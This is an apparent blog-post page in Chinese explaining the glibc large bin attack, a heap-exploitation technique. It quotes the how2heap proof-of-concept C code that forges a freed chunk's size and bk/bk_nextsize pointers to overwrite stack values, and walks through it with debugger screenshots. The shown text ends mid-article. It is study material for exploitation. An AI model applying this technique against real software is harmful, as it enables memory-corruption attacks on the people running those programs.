@@ -1,0 +1,868 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    large_bins_attack |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="针对large_bins攻击手法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="large_bins_attack">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/09/17/large_bin_attack/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="针对large_bins攻击手法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/1fvEBsPNX4Mn7Hw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/30/udryPOsYVeZwkNn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/Ed493rp5YVeMhSD.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/AjRGQYDoH2LiX9k.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/f45VEjdD7y8hukM.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/GwOHRX9ClP8ySoi.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/ikdhqBALv9nMtUm.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/6hwVCiQ3KF5vxdk.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/pBQzOAwg6Uuj23k.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/JNsZQX6avEobhkL.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/FNeOPAimTnYzD8I.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/vCMRa24h8N9PXV7.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/29/Z9uK1FhzQ6Lnm24.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/30/wLGUaxXRqhMCoOP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/06/05/lsvUaD398MOcyrf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/30/CwxAaNnGvsTzhmy.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/30/KYXDNVhj38Spkrf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/RAXrhF49Lfi2IV6.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/seXDbncofmZSaMl.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/tsJXSHRnN5dlmEc.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/IKw1d8rbqRoQW3v.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/WZqn1QPkx4fGHV8.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/rpyIBXDakJ5oFLh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/mbE5nGKOxZhS1NL.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/cGxsB26DNmiEkIj.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/wnjQxvtWCsAb8OX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/fr1LRkiaZxyPVbS.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/cvAiBKH5JtrGsCw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/Vsbm1d4e5M9XEIS.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/peTwJYr6stAXHju.png">
+<meta property="og:image" content="https://s2.loli.net/2024/09/07/lIFwNoqUY3ASEd4.png">
+<meta property="article:published_time" content="2024-09-17T02:08:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:04:57.354Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/05/29/1fvEBsPNX4Mn7Hw.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="large_bins_attack">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">large_bins_attack</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-large_bin_attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/09/17/large_bin_attack/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-09-17T02:08:00.000Z" itemprop="datePublished">2024-09-17</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-aos="zoom-in">网络安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="导言"><a class="markdownIt-Anchor" href="#导言"></a> 导言</h1>
+<p>在libc版本越来越高的情况下，许多旧的攻击方式已然失效，而large_bin_attack始终屹立不倒，是许多攻击方式的先决条件，这也是我们要学习它的原因</p>
+<h1 id="large_bin"><a class="markdownIt-Anchor" href="#large_bin"></a> large_bin</h1>
+<h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2>
+<p>large_bin是一种堆分配的管理方式，是<strong>双向链表</strong>，用于管理大于某个特定大小阈值的内存块。<strong>一般而言，进入large_bin的最低字节为0x200(512)</strong>。但由于引入了tcache_bin，使得<strong>在tcache_bin尚未填满的情况下，进入large_bin的最低字节为0x410(1040)</strong>，所以一般我们设置大堆块都是0x410起步</p>
+<h2 id="结构"><a class="markdownIt-Anchor" href="#结构"></a> 结构</h2>
+<p>large_bins中含有<strong>63个bin</strong>，而large_bins<strong>总体又被分成6个组</strong>，每个组对应一个区间，且容纳个数呈指数性减少，示意图如下<br />
+<img src="https://s2.loli.net/2024/05/29/1fvEBsPNX4Mn7Hw.png" alt="image.png" /></p>
+<p>说完组成部分，我们来看看链表的结构</p>
+<p><img src="https://s2.loli.net/2024/05/30/udryPOsYVeZwkNn.png" alt="image.png" /></p>
+<p>1.在large_bin中的排列顺序是<strong>从大到小</strong>的顺序，所以越大的chunk越靠前，越小的chunk越靠后，最小的chunk指向main_arena+一定偏移。也就是说，<strong>非尾部的fd_nextsize指向的是更小的chunk，非头部的bk_nextsize指向的是更大的chunk</strong></p>
+<p>2.在相同大小的情况下，按照free的时间进行排序</p>
+<p>3.只有首堆块的fd_nextsize,bk_nextsize会指向其它大小的堆块，而其后的堆块中fd_nextsize,bk_nextsize无效，通常为0</p>
+<p>说完了large_bin的概念和结构，那么我们现在该写如何实现large_bin_attack了。large_bin_attack也是有分水岭的，这个分水岭就是glibc-2.31，所以本文会分为两个板块，一个讲解2.23版本的large_bin_attack，另一个讲解2.31版本的large_bin_attack。这两种攻击方式我们都利用<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap" style="text-decoration:none; color:blue;">how2heap</a>项目团队编写的源码来进行讲解</p>
+<h1 id="glibc-223版本的攻击方式"><a class="markdownIt-Anchor" href="#glibc-223版本的攻击方式"></a> glibc-2.23版本的攻击方式</h1>
+<h2 id="适用条件"><a class="markdownIt-Anchor" href="#适用条件"></a> 适用条件</h2>
+<p>存在<strong>能够修改堆内容</strong>的函数</p>
+<p>从unsorted_bins里提取出来的堆块要<strong>紧挨着我们伪造过的large_bins里的堆块</strong></p>
+<h2 id="how2heap源码及动调"><a class="markdownIt-Anchor" href="#how2heap源码及动调"></a> how2heap源码及动调</h2>
+<p>首先展示源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单解释一下这段代码的意思。首先设置了stack_var1,2的值并展示了各自的地址，接下来申请了p1,p2,p3三个分别大小为0x420,0x500,0x500的大堆块(中间的0x20堆块起保护作用，防止合并)。free掉p1,p2,此时在unsorted_bins里。申请出一个0x90的堆块后，会把p2放进large_bins里，而p1先被分进small_bins里又被切割了0x90大小的堆块并被放回了unsorted_bins里。free了p3之后伪造p2的size,bk和bk_nextsize。再次申请一个0x90的堆块后，p1又会被分割，而p3会被放进large_bins，且p3的bk被赋值为了stack_var1-0x10的地址，bk_nextsize被赋值为了stack_var2-0x20的地址（至于为什么有减去这两个数，参考chunk的结构），而stack_var1,2的值都是p3的头指针(prev)</p>
+<p>啰里八嗦一大堆估计大家也看不懂，所以先动调来看看</p>
+<h3 id="申请三个堆"><a class="markdownIt-Anchor" href="#申请三个堆"></a> 申请三个堆</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
+<p>记住此时的var值和堆结构</p>
+<p><img src="https://s2.loli.net/2024/05/29/Ed493rp5YVeMhSD.png" alt="image.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/29/AjRGQYDoH2LiX9k.png" alt="image.png" /></p>
+<h3 id="逐步释放三个堆"><a class="markdownIt-Anchor" href="#逐步释放三个堆"></a> 逐步释放三个堆</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">free</span>(p3);</span><br></pre></td></tr></table></figure>
+<p>首先释放完p1,p2,一切都很正常</p>
+<p><img src="https://s2.loli.net/2024/05/29/f45VEjdD7y8hukM.png" alt="image.png" /></p>
+<p>到了比较关键的一步，申请个0x90的堆块</p>
+<p><img src="https://s2.loli.net/2024/05/29/GwOHRX9ClP8ySoi.png" alt="image.png" /></p>
+<p>可以看到，p2被放进了large_bins里，而p1地址增长了0xa0后还待在unsorted_bins里。一个malloc(0x90)干的事其实还真不少</p>
+<p>首先它将p1提取出来放进了small_bins里，将p2提取出来放到了large_bins里。为了满足malloc(0x90),系统遍历bins链表，依次从<strong>fast–&gt;unsorted–&gt;small–&gt;large–&gt;top</strong>的顺序扫描。而我们的p1很不幸就再次被提了出来，被切割，<strong>被丢回unsorted_bins等待分配</strong></p>
+<p>然后它的hxd p3就来陪它了</p>
+<p><img src="https://s2.loli.net/2024/05/29/ikdhqBALv9nMtUm.png" alt="image.png" /></p>
+<h3 id="修改p2的结构体"><a class="markdownIt-Anchor" href="#修改p2的结构体"></a> 修改p2的结构体</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>; <span class="comment">//size</span></span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//fd</span></span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>; <span class="comment">//fd_nextsize</span></span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">//bk，指向stack_var1-0x10的位置</span></span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>); <span class="comment">//bk_nextsize，指向stack_var2-0x20的位置</span></span><br></pre></td></tr></table></figure>
+<p>这是整个修改过程中最重要的部分，<strong>修改p2的结构</strong>，为后续的攻击做铺垫</p>
+<p>原结构和内容</p>
+<p><img src="https://s2.loli.net/2024/05/29/6hwVCiQ3KF5vxdk.png" alt="image.png" /></p>
+<p>经过这段代码修改过后的结构和内容</p>
+<p><img src="https://s2.loli.net/2024/05/29/pBQzOAwg6Uuj23k.png" alt="image.png" /></p>
+<p>可以看到我们已经成功完成了修改，此时p2的结构如下图所示</p>
+<p><img src="https://s2.loli.net/2024/05/29/JNsZQX6avEobhkL.png" alt="image.png" /></p>
